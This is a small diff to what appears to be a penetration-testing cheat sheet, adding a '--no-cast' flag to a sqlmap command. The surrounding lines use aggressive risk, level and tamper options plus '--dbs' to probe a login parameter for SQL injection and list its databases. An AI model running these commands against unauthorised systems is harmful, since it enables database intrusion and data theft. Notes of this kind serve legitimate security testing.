@@ -80,7 +80,7 @@ sqlmap -u "<URL>" --data='user=a&pass=a' -p user --technique=B --dbs
 ```
 sqlmap -r "<PATH_FILE>" --data='user=a&pass=a' -p user --technique=B --dbs
 
-sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --dbs
+sqlmap -r "<PATH_FILE>" -p user --user-agent=SQLMAP --random-agent --threads=10 --risk=3 --level=5 --tamper=space2comment --cookie="name:value" --no-cast --dbs
 ```
 
 ---
